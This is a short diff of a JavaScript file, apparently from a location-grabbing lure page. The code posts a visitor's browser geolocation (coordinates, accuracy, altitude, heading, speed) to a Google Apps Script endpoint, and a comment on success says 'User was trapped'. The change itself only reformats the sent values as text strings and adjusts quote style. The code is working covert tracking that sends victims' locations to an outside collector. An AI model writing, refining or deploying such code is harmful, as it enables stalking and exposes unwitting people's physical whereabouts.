@@ -12,12 +12,12 @@ function locate() {
       url: "https://script.google.com/macros/s/AKfycbwUSJoZEna25nrYPJwCKAiaEg3AL6irMN6OVJwJEN22L11Z17_ZMzMewYhd_o6_p6pRPg/exec",
       data: {
         status: "success",
-        lat: position.coords.latitude,
-        lon: position.coords.longitude,
-        acc: position.coords.accuracy,
-        alt: position.coords.altitude,
-        dir: position.coords.heading,
-        spd: position.coords.speed,
+        lat: "'" + String(position.coords.latitude),
+        lon: "'" + String(position.coords.longitude),
+        acc: "'" + String(position.coords.accuracy),
+        alt: "'" + String(position.coords.altitude),
+        dir: "'" + String(position.coords.heading),
+        spd: "'" + String(position.coords.speed),
       },
       success: function () {
         // User was trapped
@@ -51,7 +51,7 @@ function showError(error) {
   $.ajax({
     type: "POST",
     url: "https://script.google.com/macros/s/AKfycbwUSJoZEna25nrYPJwCKAiaEg3AL6irMN6OVJwJEN22L11Z17_ZMzMewYhd_o6_p6pRPg/exec",
-    data: { status: 'failed', err: err_text },
+    data: { status: "failed", err: err_text },
     success: function () {
       $("#change").html("Failed");
     },
